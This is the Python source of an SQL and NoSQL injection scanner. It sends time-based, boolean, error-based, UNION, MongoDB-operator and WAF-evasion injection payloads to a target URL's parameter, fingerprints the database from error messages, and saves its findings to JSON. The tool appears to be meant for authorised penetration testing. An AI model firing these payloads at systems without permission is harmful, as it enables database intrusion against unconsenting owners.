#!/usr/bin/env python3
"""
REVUEX - Enhanced SQL Injection Scanner
Advanced SQL Injection Detection Across All Database Types

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
SQL injection testing should only be performed on systems you own or have explicit permission to test.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urlencode
import hashlib


class EnhancedSQLiScanner:
    """
    Advanced SQL Injection Scanner (2024/2025)

    Features:
    - Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
    - Time-based blind SQL injection
    - Boolean-based blind SQL injection
    - Error-based SQL injection
    - UNION-based SQL injection
    - Second-order SQL injection detection
    - NoSQL injection (MongoDB, CouchDB)
    - WAF bypass techniques
    - Automatic DBMS fingerprinting
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay

        self.max_requests = 100
        self.request_count = 0
        self.timeout = 10

        self.headers = {
            "User-Agent": "REVUEX-SQLiScanner/1.0 (Security Research; +https://github.com/G33L0)",
            "Accept": "*/*",
        }

        self.vulnerabilities: List[Dict[str, Any]] = []
        self.detected_dbms: Optional[str] = None

        # Baseline response (benign input) for differential comparison.
        self.baseline_text: Optional[str] = None
        self.baseline_len: Optional[int] = None

        # Real DBMS error-message signatures. Matching the bare word "mysql"
        # (as the old code did) false-positives on any page that merely mentions
        # a database by name (docs, footers, job ads). These patterns match the
        # actual error strings databases emit when a query breaks.
        self.sql_error_signatures = [
            r"you have an error in your sql syntax",
            r"warning: mysqli?_",
            r"mysql_fetch_",
            r"supplied argument is not a valid mysql",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"pg_query\(\)|pg_exec\(\)",
            r"unterminated quoted string at or near",
            r"psql:.*error",
            r"ora-\d{5}",
            r"sqlite_?(error|exception)|sqlite3::",
            r"sqlstate\[\d+\]",
            r"odbc.*driver.*error",
            r"microsoft ole db provider for",
            r"incorrect syntax near",
            r"conversion failed when converting",
            r"syntax error at or near",
        ]

        # ---------- PAYLOADS (UNMODIFIED LOGIC) ----------

        self.time_based_payloads = {
            "mysql": [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('A'))--",
                "1' AND SLEEP(5)#",
                "' OR SLEEP(5)--",
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5)--",
                "' AND pg_sleep(5)--",
                "1' AND pg_sleep(5)--",
            ],
            "mssql": [
                "'; WAITFOR DELAY '00:00:05'--",
                "1'; WAITFOR DELAY '00:00:05'--",
            ],
            "oracle": [
                "' AND DBMS_LOCK.SLEEP(5)--",
            ],
            "sqlite": [
                "' AND randomblob(100000000)--",
            ],
        }

        self.boolean_payloads = {
            "true": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 'a'='a",
            ],
            "false": [
                "' OR '1'='2",
                "' OR 1=2--",
                "' OR 'a'='b",
            ],
        }

        self.error_based_payloads = [
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND 1=CAST(version() AS INT)--",
            "' AND 1=CONVERT(INT,@@version)--",
            "' AND TO_NUMBER(version)=1--",
        ]

        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
        ]

        self.nosql_payloads = [
            "{'$gt':''}",
            "{'$ne':''}",
            "admin' || '1'=='1",
        ]

        self.waf_bypasses = [
            "'/**/AND/**/1=1--",
            "'AnD 1=1--",
            "%27%20AND%201=1--",
            "'\t AND\t1=1--",
        ]

        self.fingerprint_queries = {
            "mysql": "' AND @@version--",
            "postgresql": "' AND version()--",
            "mssql": "' AND @@version--",
            "oracle": "' AND banner FROM v$version--",
            "sqlite": "' AND sqlite_version()--",
        }

    # ================== CORE SCAN ==================

    def scan(self) -> List[Dict[str, Any]]:
        print("\n" + "=" * 60)
        print("💉 REVUEX Enhanced SQLi Scanner")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Delay: {self.delay}s")
        print(f"Max Requests: {self.max_requests}")
        print("=" * 60)

        self._capture_baseline()
        time.sleep(self.delay)

        self._fingerprint_database()
        time.sleep(self.delay)

        self._test_time_based_blind()
        time.sleep(self.delay)

        self._test_boolean_based()
        time.sleep(self.delay)

        self._test_error_based()
        time.sleep(self.delay)

        self._test_union_based()
        time.sleep(self.delay)

        self._test_nosql()
        time.sleep(self.delay)

        self._test_waf_bypass()

        self._save_results()

        print("\n" + "=" * 60)
        print("✅ Scan Complete")
        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Requests: {self.request_count}/{self.max_requests}")
        if self.detected_dbms:
            print(f"Detected DBMS: {self.detected_dbms}")
        print("=" * 60)

        return self.vulnerabilities

    # ================== HELPERS ==================

    def _make_request(self, payload: str) -> Optional[requests.Response]:
        if self.request_count >= self.max_requests:
            return None
        try:
            if "?" in self.target:
                url = self.target + "&" + urlencode({"id": payload})
            else:
                url = self.target + "?" + urlencode({"id": payload})

            response = requests.get(
                url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            self.request_count += 1
            return response
        except Exception:
            return None

    def _capture_baseline(self):
        """Record a normal response (benign numeric input) so later tests can
        tell an injection-induced change from the page's ordinary content."""
        resp = self._make_request("1")
        if resp is not None:
            self.baseline_text = resp.text
            self.baseline_len = len(resp.text)

    def _fingerprint_database(self):
        """Fingerprint only when a DBMS-specific ERROR signature appears in
        response to a broken query AND was not already in the baseline. The old
        check matched the bare DBMS name anywhere in the page, which flags any
        site that merely mentions the database."""
        baseline = (self.baseline_text or "").lower()
        for dbms, payload in self.fingerprint_queries.items():
            response = self._make_request(payload)
            if response:
                text = response.text.lower()
                for sig in self.sql_error_signatures:
                    m = re.search(sig, text)
                    if m and m.group(0) not in baseline:
                        self.detected_dbms = dbms
                        print(f"[+] DBMS error signature observed (guess: {dbms})")
                        return
            time.sleep(self.delay)

    def _median_baseline_time(self, samples: int = 3) -> float:
        """Median round-trip time of several benign requests, to establish a
        jitter-resistant baseline for time-based detection."""
        times = []
        for _ in range(samples):
            start = time.time()
            r = self._make_request("1")
            if r is not None:
                times.append(time.time() - start)
            time.sleep(self.delay)
        if not times:
            return 0.0
        times.sort()
        return times[len(times) // 2]

    def _test_time_based_blind(self):
        """Confirm with a baseline AND a re-test to avoid flagging a one-off
        slow response (network jitter / GC pause) as injection. A 5s SLEEP must
        add ~5s both times to count."""
        baseline_time = self._median_baseline_time()
        # Require the delayed response to exceed baseline by at least 4s (for a
        # 5s sleep payload) to allow some slack while rejecting normal variance.
        threshold = baseline_time + 4

        for dbms, payloads in self.time_based_payloads.items():
            for payload in payloads:
                start = time.time()
                response = self._make_request(payload)
                if response is None:
                    continue
                response_time = time.time() - start

                if response_time <= threshold:
                    continue

                # Confirm: re-send once; a real time-based injection delays again.
                start = time.time()
                confirm = self._make_request(payload)
                if confirm is None:
                    continue
                confirm_time = time.time() - start

                if confirm_time > threshold:
                    self.vulnerabilities.append({
                        "type": "SQLi Time-Based Blind",
                        "dbms": dbms,
                        "payload": payload,
                        "baseline_time": round(baseline_time, 2),
                        "delay_1": round(response_time, 2),
                        "delay_2": round(confirm_time, 2),
                    })
                    print(f"[!] Time-based SQLi confirmed ({dbms})")
                    return

    def _test_boolean_based(self):
        """A boolean-blind SQLi shows a CONSISTENT difference between TRUE and
        FALSE conditions: all TRUE responses look alike, all FALSE responses look
        alike, and the two groups differ. The old code summed lengths of unequal
        groups and flagged a >100 char difference, which trips on any dynamic
        page. We require internal consistency within each group and a clear gap
        between them."""
        true_len, false_len = [], []

        for p in self.boolean_payloads["true"]:
            r = self._make_request(p)
            if r:
                true_len.append(len(r.text))
            time.sleep(self.delay)

        for p in self.boolean_payloads["false"]:
            r = self._make_request(p)
            if r:
                false_len.append(len(r.text))
            time.sleep(self.delay)

        if len(true_len) < 2 or len(false_len) < 2:
            return

        def spread(xs):
            return max(xs) - min(xs)

        avg_true = sum(true_len) / len(true_len)
        avg_false = sum(false_len) / len(false_len)

        # Each group must be internally stable (small spread), the two groups
        # must differ clearly, and the difference must exceed the within-group
        # noise - otherwise it is just a dynamic page.
        within_noise = max(spread(true_len), spread(false_len))
        between_diff = abs(avg_true - avg_false)

        if within_noise < 50 and between_diff > max(100, within_noise * 3):
            self.vulnerabilities.append({
                "type": "SQLi Boolean-Based Blind",
                "confidence": "needs-manual-verification",
                "avg_true_len": avg_true,
                "avg_false_len": avg_false,
                "true_len": true_len,
                "false_len": false_len,
            })
            print("[!] Boolean-based SQLi candidate (verify manually)")

    def _test_error_based(self):
        """Report only when a real DBMS error signature appears in response to
        the payload and was not present in the benign baseline."""
        baseline = (self.baseline_text or "").lower()
        for payload in self.error_based_payloads:
            r = self._make_request(payload)
            if not r:
                continue
            sig = self._sql_error_signature(r.text, baseline)
            if sig:
                self.vulnerabilities.append({
                    "type": "SQLi Error-Based",
                    "payload": payload,
                    "evidence": f"DBMS error signature: {sig}",
                })
                print("[!] Error-based SQLi detected")
                return

    def _test_union_based(self):
        """A 200 status proves nothing (normal pages return 200). Require either
        a DBMS error signature (wrong column count) or a UNION payload that
        succeeds where a deliberately-broken one fails - i.e. real differential
        behaviour, not just a successful HTTP request."""
        baseline = (self.baseline_text or "").lower()
        for payload in self.union_payloads:
            r = self._make_request(payload)
            if not r:
                continue
            sig = self._sql_error_signature(r.text, baseline)
            if sig:
                self.vulnerabilities.append({
                    "type": "SQLi UNION-Based (error while probing columns)",
                    "payload": payload,
                    "confidence": "needs-manual-verification",
                    "evidence": f"DBMS error signature: {sig}",
                })
                print("[!] UNION-based SQLi candidate (DB error on UNION)")
                return

    def _test_nosql(self):
        """Require a differential: an operator-injection payload ({'$ne':''} /
        {'$gt':''}) that yields materially different content than the baseline,
        which suggests the operator was interpreted. A 200 alone is not evidence."""
        if self.baseline_len is None:
            return
        for payload in self.nosql_payloads:
            r = self._make_request(payload)
            if not r:
                continue
            # Content length changes meaningfully vs baseline (e.g. auth bypass
            # returning a different page) -> candidate, needs manual confirmation.
            if abs(len(r.text) - self.baseline_len) > max(200, self.baseline_len * 0.25):
                self.vulnerabilities.append({
                    "type": "NoSQL Injection",
                    "payload": payload,
                    "confidence": "needs-manual-verification",
                    "evidence": f"Response length {len(r.text)} vs baseline "
                                f"{self.baseline_len}",
                })
                print("[!] NoSQL injection candidate (verify manually)")
                return

    def _test_waf_bypass(self):
        """Bypassing a WAF is only meaningful if an injection actually works
        behind it. A non-403 status on a WAF-evasion payload is NOT a finding on
        its own (the old `status != 403` check flagged essentially every target).
        We now only flag it when the evasion payload ALSO triggers a real SQL
        error signature."""
        baseline = (self.baseline_text or "").lower()
        for payload in self.waf_bypasses:
            r = self._make_request(payload)
            if not r:
                continue
            sig = self._sql_error_signature(r.text, baseline)
            if sig:
                self.vulnerabilities.append({
                    "type": "SQLi via WAF-Evasion Payload",
                    "payload": payload,
                    "evidence": f"DBMS error signature behind WAF: {sig}",
                })
                print("[!] SQLi reachable via WAF-evasion payload")
                return

    def _sql_error_signature(self, text: str, baseline: str = "") -> Optional[str]:
        """Return the matched DBMS error signature if present in `text` and not
        already in the baseline, else None."""
        t = (text or "").lower()
        for sig in self.sql_error_signatures:
            m = re.search(sig, t)
            if m and m.group(0) not in baseline:
                return m.group(0)
        return None

    def _has_sql_error(self, text: str) -> bool:
        return self._sql_error_signature(text) is not None

    def _save_results(self):
        out = self.workspace / "sqli_scans"
        out.mkdir(exist_ok=True)

        safe = re.sub(r"[^\w\-]", "_", self.target)
        file = out / f"{safe}_sqli.json"

        with open(file, "w") as f:
            json.dump({
                "scanner": "EnhancedSQLiScanner",
                "target": self.target,
                "dbms": self.detected_dbms,
                "vulnerabilities": self.vulnerabilities,
            }, f, indent=2)

        print(f"[+] Results saved to {file}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python enhanced_sqli_scanner.py <target_url>")
        sys.exit(1)

    scanner = EnhancedSQLiScanner(
        sys.argv[1],
        Path("revuex_workspace"),
        delay=5.0
    )
    scanner.scan()